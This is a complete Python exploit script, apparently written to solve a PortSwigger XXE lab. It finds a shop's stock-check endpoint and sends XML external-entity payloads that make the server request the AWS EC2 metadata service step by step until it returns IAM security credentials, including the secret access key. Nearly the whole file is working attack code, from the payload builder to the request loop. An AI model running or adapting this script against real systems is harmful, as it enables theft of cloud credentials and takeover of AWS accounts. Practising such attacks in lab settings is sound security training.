#!/usr/bin/env python3
# === Exploit Script: XXE via SSRF against EC2 Metadata ===

import requests
from bs4 import BeautifulSoup
import sys

def banner():
    print("\n=== 💀 XXE → SSRF Exploit: IAM Key Extraction 💀 ===")
    print(">>> PortSwigger Lab Automation | Shadow Junior 😈")
    print(">>> GANGA Autonomous Mode | Phase: Recon → Lateral Exploit\n")

def get_lab_url():
    try:
        url = input("🔗 Enter the full lab URL (e.g., https://xyz.web-security-academy.net): ").strip()
        if not url.startswith("http"):
            raise ValueError("Invalid URL format.")
        return url.rstrip('/')
    except Exception as e:
        print(f"[!] Input Error: {e}")
        sys.exit(1)

def get_product_stock_url(base_url):
    print("[*] Discovering stock check path from product page...")
    product_url = f"{base_url}/product?productId=1"
    try:
        r = requests.get(product_url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        if not form:
            raise Exception("Form element not found.")
        action = form.get("action")
        if not action:
            raise Exception("No form action found.")
        full_url = base_url + action
        print(f"[✓] Stock check endpoint: {full_url}")
        return full_url
    except Exception as e:
        print(f"[!] Failed to resolve stock check form: {e}")
        sys.exit(1)

def craft_xxe_payload(target_url):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{target_url}"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>"""

def send_xxe_request(post_url, xml_payload):
    headers = {
        "Content-Type": "application/xml"
    }
    try:
        r = requests.post(post_url, data=xml_payload, headers=headers, timeout=10)
        return r.text
    except Exception as e:
        print(f"[!] POST request failed: {e}")
        return None

def attack_chain(base_url):
    endpoint = get_product_stock_url(base_url)
    metadata_path = "/latest/meta-data/iam/security-credentials/admin"

    # Stepwise metadata discovery chain
    chain = [
        "/",
        "/latest",
        "/latest/meta-data",
        "/latest/meta-data/iam",
        "/latest/meta-data/iam/security-credentials",
        metadata_path
    ]

    for step in chain:
        target = f"http://169.254.169.254{step}"
        print(f"\n[>] Probing {target}...")
        payload = craft_xxe_payload(target)
        response = send_xxe_request(endpoint, payload)

        if not response:
            print("[!] No response or timeout.")
            continue

        print("[✓] Response snippet:\n" + "-"*60)
        print(response[:500])
        print("-"*60)

        if "SecretAccessKey" in response:
            print("[💥] Secret Access Key Found!")
            break

if __name__ == "__main__":
    banner()
    base_url = get_lab_url()
    attack_chain(base_url)
